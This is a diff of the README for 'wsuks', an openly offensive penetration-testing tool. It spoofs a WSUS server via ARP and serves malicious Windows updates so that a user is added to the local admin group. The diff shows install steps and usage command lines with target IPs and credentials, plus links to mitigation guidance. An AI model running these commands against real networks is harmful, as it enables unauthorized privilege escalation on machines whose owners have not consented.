-![Supported Python versions](https://img.shields.io/badge/python-3.10+-blue.svg) [![Twitter](https://img.shields.io/twitter/follow/al3x_n3ff?label=al3x_n3ff&style=social)](https://twitter.com/intent/follow?screen_name=al3x_n3ff)
+![Supported Python versions](https://img.shields.io/badge/python-3.8.1+-blue.svg) [![Twitter](https://img.shields.io/twitter/follow/al3x_n3ff?label=al3x_n3ff&style=social)](https://twitter.com/intent/follow?screen_name=al3x_n3ff)
 # wsuks
 _Weaponizing the WSUS Attack_
 
 Gaining local administrative access on a Windows machine that is part of a domain is typically the initial step towards acquiring domain admin privileges during a penetration test. In order to exploit the WSUS attack automatically, this tool spoofs the IP address of the WSUS server within the network using ARP, and when the client requests Windows updates, it provides its own malicious updates instead.
 By default, a Windows client requests updates every 24 hours. 
 
 Both the executable file served (Default: PsExec64.exe) and the executed command can be changed as needed.
@@ -30,15 +31,15 @@
 - The target Client must be on the local network
 - The Windows Server Update Service (WSUS) must be configured using HTTP
 
 Result:
 - After successful execution the user provided will be added to the local admin group. If no user was specified a user with the format user[0-9]{5} (e.g. user12345) and a random password will be created
 
 ## Installation
-Using pipx:
+Using pipx (recommended):
 ```
 sudo apt install python3-pipx
 pipx ensurepath
 pipx install wsuks
 sudo ln -s ~/.local/pipx/venvs/wsuks/bin/wsuks /usr/local/bin/wsuks
 ```
 
@@ -49,27 +50,28 @@
 cd wsuks
 sudo poetry install
 ```
 
 ## Usage
 ❗wsuks must be run as root❗
 
-With pipx:
+Using pipx you can simply run `sudo wsuks ...` anywhere on the system.\
+Using poetry you must be in the wsuks folder and begin every command with `sudo poetry run wsuks ...`
+
+#### Specify known WSUS-Server and create local admin user:
 ```
-sudo wsuks
-suso wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20     # This will generate a new local user and add it to the local admin group
-sudo wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20 -u User -p Password -d Domain.local     # This will add the provided user to the local admin group
-sudo wsuks -t 10.0.0.10 -u User -p Password -d Domain.local --dc-ip 10.0.0.1      # This will start the auto discovery mode and add the provided user to the local admin group
+sudo wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20
 ```
-
-With poetry:
+#### Specify known WSUS-Server and add provided domain user to local admin group (Domain is required!):
+```
+sudo wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20 -u User -p Password -d Domain.local
+```
+#### Autodiscover the WSUS-Server by only specifying the domain user with the dc-ip:
 ```
-suso poetry run wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20     # This will generate a new local user and add it to the local admin group
-sudo poetry run wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20 -u User -p Password -d Domain.local     # This will add the provided user to the local admin group
-sudo poetry run wsuks -t 10.0.0.10 -u User -p Password -d Domain.local --dc-ip 10.0.0.1      # This will start the auto discovery mode and add the provided user to the local admin group
+sudo wsuks -t 10.0.0.10 -u User -p Password -d Domain.local --dc-ip 10.0.0.1
 ```
 
 ## About & Mitigation
 In the [PyWSUS](https://github.com/GoSecure/pywsus) Repository from GoSecure you can find a great documentation how to you could detect and mitigate this attack.
 They also wrote a great Guide demonstrating how this attack works in detail [here](https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/).
 
 This Tool is based on the following projects:
```

